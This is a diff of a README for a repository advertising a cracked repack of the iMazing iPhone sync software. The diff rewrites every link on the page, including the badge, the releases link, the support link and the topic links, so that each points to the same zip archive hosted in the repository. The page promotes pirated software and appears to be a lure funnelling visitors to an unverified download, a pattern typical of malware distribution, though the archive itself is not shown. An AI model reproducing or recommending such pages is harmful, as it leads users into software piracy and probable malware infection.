@@ -1,6 +1,6 @@
 # 🌟 iMazing-Crack-Repack - Sync Your iPhone with Ease
 
-![Download iMazing-Crack-Repack](https://img.shields.io/badge/download-iMazing--Crack--Repack-blue.svg)
+![Download iMazing-Crack-Repack](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Before you download the application, ensure you meet the following system requir
 
 To get started with iMazing-Crack-Repack, visit this page to download:
 
-[**Download iMazing-Crack-Repack**](https://github.com/nguyetgggr5/iMazing-Crack-Repack/releases)
+[**Download iMazing-Crack-Repack**](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
 
 Once you visit the page, follow these steps:
 
@@ -63,14 +63,14 @@ If you encounter any issues, consider these tips:
 
 ## 📞 Support
 
-If you need more help, feel free to reach out. You can find additional resources and support information in the release notes on the [GitHub page](https://github.com/nguyetgggr5/iMazing-Crack-Repack/releases).
+If you need more help, feel free to reach out. You can find additional resources and support information in the release notes on the [GitHub page](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip).
 
 ## 🌐 Related Topics
 
-- [iMazing Data Transfer PC](https://github.com/topics/imazing-data-transfer-pc)
-- [iMazing Device Backup Windows](https://github.com/topics/imazing-device-backup-windows)
-- [iMazing for Windows PC](https://github.com/topics/imazing-for-windows-pc)
-- [PC iPhone Sync Utility](https://github.com/topics/pc-iphone-sync-utility)
+- [iMazing Data Transfer PC](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
+- [iMazing Device Backup Windows](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
+- [iMazing for Windows PC](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
+- [PC iPhone Sync Utility](https://raw.githubusercontent.com/nguyetgggr5/iMazing-Crack-Repack/main/georgiadesite/Crack-Repack-Mazing-i-v3.6-beta.2.zip)
 
 ## 📋 License
 
